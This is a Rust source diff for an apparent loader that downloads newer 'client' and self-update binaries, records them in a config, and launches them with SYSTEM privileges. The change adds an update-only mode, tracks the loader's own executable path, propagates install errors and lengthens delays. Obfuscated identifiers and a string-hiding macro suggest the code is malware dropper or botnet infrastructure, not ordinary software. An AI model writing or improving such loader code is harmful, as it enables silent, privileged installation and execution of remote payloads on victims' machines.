@@ -10,63 +10,65 @@ use shared::{
     network::basic::download_bytes_from_url,
     utils::{
         config::{ load_mib_config, write_mib_config, HstCnfg },
-        functions::{ generate_random_string, try_spawn_program_as_system },
+        functions::{
+            generate_random_string,
+            get_current_exe,
+            get_current_exe_dir,
+            try_spawn_program_as_system,
+        },
     },
 };
 
 use crate::info;
 
-pub fn run_config(params: RnCnfgPrms) -> Result<()> {
+pub fn run_config(params: RnCnfgPrms, update_only: bool) -> Result<()> {
     if !params.enbl {
         return Ok(());
     }
 
     let mib_config = load_mib_config(true)?;
 
-    let mut highest_installed_client_version = 0;
+    let mut highest_installed_client = HstCnfg::default();
     for client in &mib_config.clnts {
-        if client.version > highest_installed_client_version {
-            highest_installed_client_version = client.version;
+        if client.version > highest_installed_client.version {
+            highest_installed_client = client.clone();
         }
     }
-    if params.cl_vrs > highest_installed_client_version {
+    if params.cl_vrs > highest_installed_client.version {
         if let Some(client_source) = params.cl_src {
             info!("install_client");
-            let _ = install_client(client_source, params.cl_vrs);
+            install_client(client_source, params.cl_vrs)?;
         }
-    } else {
+    } else if !highest_installed_client.exe_path.is_empty() && !update_only {
         // this means up to date installed or higher installed.
         // just run
 
-        let highest_client = mib_config.clnts.iter().max_by_key(|client| client.version);
-
-        if let Some(cl) = highest_client {
-            info!("spawning client: ", cl);
-            try_spawn_program_as_system(&cl.exe_path, None)?;
-        }
+        info!("spawning client: ", highest_installed_client);
+        try_spawn_program_as_system(&highest_installed_client.exe_path, None)?;
     }
 
-    let mut highest_installed_loader_version = loader_version();
+    let mut highest_installed_loader = HstCnfg {
+        version: loader_version(),
+        folder_path: get_current_exe_dir()?.to_str().unwrap().to_owned(),
+        exe_path: get_current_exe()?.to_str().unwrap().to_owned(),
+        config_path: get_current_exe_dir()?.join(s!("cache.cfg")).to_str().unwrap().to_owned(),
+    };
     for loader in &mib_config.ldrs {
-        if loader.version > highest_installed_loader_version {
-            highest_installed_loader_version = loader.version;
+        if loader.version > highest_installed_loader.version {
+            highest_installed_loader = loader.clone();
         }
     }
-    if params.upd_enbl && params.slf_vrs > highest_installed_loader_version {
+    if params.upd_enbl && params.slf_vrs > highest_installed_loader.version {
         if let Some(self_source) = params.slf_src {
             info!("install_self");
-            let _ = install_self(self_source, params.slf_vrs);
+            install_self(self_source, params.slf_vrs)?;
         }
-    } else {
+    } else if !update_only {
         // this means up to date installed or higher installed or update disabled
         // just run current
 
-        let highest_loader = mib_config.ldrs.iter().max_by_key(|loader| loader.version);
-
-        if let Some(ldr) = highest_loader {
-            info!("spawning ldr: ", ldr);
-            try_spawn_program_as_system(&ldr.exe_path, None)?;
-        }
+        info!("spawning ldr: ", highest_installed_loader);
+        try_spawn_program_as_system(&highest_installed_loader.exe_path, None)?;
     }
 
     Ok(())
@@ -101,7 +103,7 @@ fn install_client(source: FlSrc, version: u64) -> Result<()> {
     });
 
     write_mib_config(&mib_config)?;
-    std::thread::sleep(Duration::from_millis(300));
+    std::thread::sleep(Duration::from_millis(2000));
 
     try_spawn_program_as_system(exe_path.to_str().unwrap(), None)?;
 
@@ -138,7 +140,7 @@ fn install_self(source: FlSrc, version: u64) -> Result<()> {
     });
 
     write_mib_config(&mib_config)?;
-    std::thread::sleep(Duration::from_millis(300));
+    std::thread::sleep(Duration::from_millis(2000));
 
     try_spawn_program_as_system(exe_path.to_str().unwrap(), None)?;
 
